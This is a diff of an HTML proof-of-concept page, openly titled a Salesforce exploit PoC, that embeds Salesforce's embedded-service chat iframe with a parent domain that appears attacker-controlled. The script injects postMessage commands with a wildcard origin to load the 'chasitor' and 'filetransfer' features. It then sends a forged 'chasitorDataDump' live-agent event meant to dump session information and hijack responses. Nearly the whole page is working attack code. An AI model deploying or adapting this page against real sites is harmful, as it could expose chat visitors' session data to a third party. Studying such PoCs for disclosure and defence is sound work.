@@ -1,70 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Salesforce Chasitor Exploit PoC</title>
   <meta charset="UTF-8">
+  <title>Salesforce PoC - Chasitor Interaction</title>
   <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
-    pre { white-space: pre-wrap; }
+    iframe { width: 100%; height: 500px; border: 1px solid #ccc; }
+    body { font-family: monospace; padding: 10px; }
   </style>
 </head>
 <body>
-  <h2>[+] Salesforce Chasitor Reflection PoC</h2>
-  <pre id="log">Initializing...</pre>
-
+  <h3>[+] Salesforce iframe interaction PoC</h3>
   <iframe id="eswFrame"
-    src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://your-site.example"
-    style="width:0; height:0; border:0;" 
-    onload="onIframeLoad()"
-    allow="camera *; microphone *;">
-  </iframe>
+          src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.wangdubruh.xyz"
+          allow="camera *; microphone *;"
+          onload="onIframeLoad()"></iframe>
 
   <script>
-    const log = (...args) => {
-      const l = document.getElementById('log');
-      l.textContent += "\n" + args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' ');
-    };
+    const iframe = document.getElementById('eswFrame');
+    let once = false;
 
-    let iframe = document.getElementById("eswFrame");
-
+    // Listen for messages FROM Salesforce iframe
     window.addEventListener("message", (e) => {
-      if (e.origin.includes("force.com") || e.origin.includes("salesforce.com")) {
-        log("📩 Message from iframe:", e.data);
+      const msg = e.data;
+      if (typeof msg === 'object') {
+        console.log("📩 Message from iframe:", msg);
       }
     });
 
-    function sendPayload() {
-      log("📤 Sending script.load for feature: 'chasitor'");
-      iframe.contentWindow.postMessage({
-        method: "script.load",
-        feature: "chasitor"
-      }, "*");
+    // Called when iframe is loaded
+    function onIframeLoad() {
+      console.log("[+] Iframe loaded (Salesforce 4.0)");
 
-      log("📤 Sending script.load for feature: 'filetransfer'");
-      iframe.contentWindow.postMessage({
-        method: "script.load",
-        feature: "filetransfer"
-      }, "*");
+      // Load features
+      postMessageToIframe({ method: "script.load", feature: "chasitor" });
+      postMessageToIframe({ method: "script.load", feature: "filetransfer" });
 
+      // Delay before sending fake event to dump session info
       setTimeout(() => {
-        log("📤 Sending fake liveagent.event to trigger reflection");
-
-        iframe.contentWindow.postMessage({
+        console.log("📤 Sending fake liveagent.event to iframe");
+        postMessageToIframe({
           method: "liveagent.event",
           data: {
             event: "chasitorDataDump",
-            params: {
-              key: "POC",
-              value: "Response hijack attempt"
-            }
+            params: { key: "POC", value: "response hijack attempt" }
           }
-        }, "*");
+        });
       }, 2000);
     }
 
-    function onIframeLoad() {
-      log("[+] Iframe loaded (Salesforce 4.0)");
-      setTimeout(sendPayload, 1000);
+    function postMessageToIframe(message) {
+      iframe.contentWindow.postMessage(message, "*");
     }
   </script>
 </body>
